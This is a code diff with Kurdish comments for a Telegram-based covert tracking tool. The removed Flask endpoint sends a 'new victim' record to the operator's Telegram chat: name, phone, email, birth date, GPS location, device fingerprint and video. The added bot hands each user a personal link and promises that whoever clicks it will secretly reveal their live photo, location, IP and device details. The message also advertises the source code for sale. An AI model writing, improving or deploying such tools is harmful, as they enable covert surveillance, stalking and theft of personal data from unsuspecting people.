@@ -1,68 +1,96 @@
-from flask import Flask, request, jsonify
-import requests
 import json
 import os
+import requests
 
-app = Flask(__name__)
+TOKEN = os.environ.get("BOT_TOKEN")
+# لینکە گشتییەکەی ماڵپەڕەکەت لێرە دابنە (دڵنیابە لەوەی کۆتاییەکەی / یان هەبێت)
+WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/"
 
-BOT_TOKEN = "TOKEN_BOT_123456:ABC-DEF..."  # تۆکەنی بۆتەکەت لێرە دانە
-CHAT_ID = "YOUR_CHAT_ID"                   # چات ئاییدی خۆت لێرە دانە
-
-@app.route('/submit', methods=['POST'])
-def submit():
-    name = request.form.get('name')
-    phone = request.form.get('phone')
-    email = request.form.get('email')
-    dob = request.form.get('dob')
+def load_users():
+    """خوێندنەوەی لیستی بەکارهێنەران لە فایلی users.json"""
+    users_list = []
+    if os.path.exists("users.json"):
+        try:
+            with open("users.json", "r", encoding="utf-8") as f:
+                content = f.read().strip()
+                if content:
+                    users_list = json.load(f)
+        except Exception as e:
+            print(f"هەڵە لە خوێندنەوەی users.json: {e}")
     
-    raw_data = request.form.get('data')
-    device_data = json.loads(raw_data) if raw_data else {}
+    admin_id = 6782298541
+    if admin_id not in users_list:
+        users_list.append(admin_id)
+        
+    return users_list
 
-    # دروستکردنی ناوەرۆکی تێکست بۆ تەلەگرام
-    text_message = (
-        f"🚨 **قوربانییەکی نوێ تۆمارکرا!** 🚨\n\n"
-        f"👤 **ناو:** {name}\n"
-        f"📱 **تەلەفۆن:** {phone}\n"
-        f"📧 **ئیمەیڵ:** {email}\n"
-        f"📅 **ڕێکەوتی لەدایکبوون:** {dob}\n\n"
-        f"🌐 **لۆکەیشن:** {device_data.get('lat')}, {device_data.get('lon')}\n"
-        f"💾 **قەبارەی بیرگە (Storage):** {device_data.get('storageUsage')} / {device_data.get('storageQuota')}\n"
-        f"🔵 **بلوتوث:** {device_data.get('bluetoothAvailable')}\n"
-        f"🎮 **کارتی گرافیک (GPU):** {device_data.get('gpuVendor')} - {device_data.get('gpuRenderer')}\n"
-        f"🔤 **فۆنتەکان:** {device_data.get('fonts')}\n"
-        f"🔋 **پاتری:** {device_data.get('battery')}\n"
-        f"💻 **ڕام و ناوکەکان:** {device_data.get('ram')} GB RAM | {device_data.get('cores')} Cores\n"
-        f"🖥 **شاشە:** {device_data.get('screen')}\n"
-        f"🔍 **ئامێر و ڤێرژن:** {device_data.get('userAgent')}"
-    )
+def save_users(users):
+    """پاشەکەوتکردنەوەی لیستی بەکارهێنەران بۆ ناو فایلی users.json"""
+    with open("users.json", "w", encoding="utf-8") as f:
+        json.dump(users, f, indent=4, ensure_ascii=False)
 
-    # ناردنی تێکستەکە بۆ تەلەگرام
-    requests.post(
-        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-        data={"chat_id": CHAT_ID, "text": text_message, "parse_mode": "Markdown"}
-    )
+def send_message(chat_id, text):
+    """ناردنی نامە بۆ بەکارهێنەرێکی دیاریکراو"""
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    payload = {
+        "chat_id": chat_id,
+        "text": text,
+        "parse_mode": "Markdown"
+    }
+    response = requests.post(url, json=payload)
+    print(f"وەڵامی ناردنی نامە بۆ {chat_id}: {response.json()}")
+    return response.json()
 
-    # ناردنی وێنە ئەگەر بوونی هەبեր
-    image_file = request.files.get('image')
-    if image_file:
-        # گۆڕینەوەی base64 بۆ فایلی ئاسایی ئەگەر پێویست بکات، لێرەدا چونکە Multipart Formـە ڕاستەوخۆ دەتوانین بینێرین:
-        pass
+def get_updates():
+    """وەرگرتنی نامە نوێیەکان لە تەلەگرامەوە"""
+    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
+    response = requests.get(url)
+    return response.json()
 
-    # ناردنی وێنە ئەگەر لە Base64ـەوە هاتبێت یان ڤیدیۆ
-    if 'image' in request.files or 'image' in request.form:
-        # دەتوانیت وێنەکەش وەک فۆتۆ بنێریت
-        pass
+def main():
+    if not TOKEN:
+        print("تۆکەنی بۆت بونی نییە!")
+        return
 
-    # ناردنی ڤیدیۆ بۆ بۆتەکەی تەلەگرام
-    video_file = request.files.get('video')
-    if video_file:
-        requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
-            data={"chat_id": CHAT_ID, "caption": f"🎥 کورتە ڤیدیۆی قوربانی: {name}"},
-            files={"video": ("video.webm", video_file.read(), "video/webm")}
+    users = load_users()
+    print(f"لیستی بەکارهێنەران بۆ ناردن: {users}")
+
+    updates = get_updates()
+    print(f"وەڵامی getUpdates: {updates}")
+
+    if "result" in updates:
+        for update in updates["result"]:
+            if "message" in update and "chat" in update["message"]:
+                chat_id = update["message"]["chat"]["id"]
+                text = update["message"].get("text", "")
+
+                if text == "/start":
+                    if chat_id not in users:
+                        users.append(chat_id)
+                        print(f"بەکارهێنەری نوێ دۆزرایەوە و زیادکرا: {chat_id}")
+
+    save_users(users)
+
+    # ناردنی لینک و ڕونکردنەوە بۆ هەموو بەکارهێنەران لەڕێگەی GitHub Actionsـەوە
+    for user_id in users:
+        personal_link = f"{WEB_APP_URL}?id={user_id}"
+        announcement_text = (
+            f"👋 سڵاو! ئەم سیستمە پێشکەوتووە لەلایەن میلاد مزوری**ـەوە دروست کراوە.\n\n"
+            f"ℹ️ **دەربارەی ئەم لینکە:**\n"
+            f"ئەم لینکە تایبەتە بە کۆکردنەوەی زانیاری تەکنیکی و وێنەی کەسی بەرامبەر. کاتێک تۆ ئەم لینکە بۆ هەر کەسێک دەنێریت و ئەو کلیکی لەسەر بکات، سەرجەم زانیارییە وردەکانی ئامێرەکەی (وەک وێنەی ڕاستەوخۆ، لۆکەیشنی GPS، جۆری ئامێر، IP و هتد) ڕاستەوخۆ و بە نهێنی بۆخۆت دێنەوە بۆ تەلەگرام، بێ ئەوەی خاوەن ئامێرەکە هەست بە هیچ شتێک بکات یان شتێک لەلای خۆی ببینێت!\n\n"
+            f"🔗 **لینکی تایبەتی تۆ:**\n"
+            f"{personal_link}\n\n"
+            f"💡 **تێبینی و دڵنیایی:**\n"
+            f"مەترسە، دەتوانیت پێش ئەوەی لینکەکە بۆ کەسێکی تر بنێریت، خۆت سەرەتا تایبەتمەندییەکەی تاقی بکەیتەوە و کلیک لەسەر لینکەکەی خۆت بکەیت تاوەکو بە چاوی خۆت بینی چۆن زانیارییەکانت بۆ دێنەوە. سیستەمەکە بە شێوەیەک دروستکراوە کە هیچ داتایەک لەلای خاوەن بۆت هەڵناگیرێت و تەنها زانیارییەکان بۆ کەسی بەکارهێنەر دەگەڕێنەوە.\n\n"
+            f"💬 **سەبارەت به سەرنج و تێبینی:**\n"
+            f"بۆ هەر سەرنج و تێبینییەک دەتوانیت نامە بۆ دروستکەری ئەم بۆتە (میلاد غازی) بنێریت:\n"
+            f"https://t.me/MiladGhaziHussein\n\n"
+            f"🛒 **داواکردنی هەمان بۆت:**\n"
+            f"ئەگەر تۆش دەتەوێت **هەمان ئەم بۆتە بە ناوی خۆتەوە هەبێت و بە تەواوی لەژێر دەستی خۆتدا بێت، دەتوانیت سۆرس کۆدی بۆتەکە بکڕیت:\n"
+            f"• سۆرس کۆدی بۆتەکە بە فێرکارییەوە: ٢٠،٠٠٠ دینار**\n"
+            f"• سۆرس کۆدی بۆتەکە بێ فێرکاری: **١٥،٠٠٠ دینار"
         )
+        send_message(user_id, announcement_text)
 
-    return jsonify({"status": "success"})
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+if name == "main":
+    main()
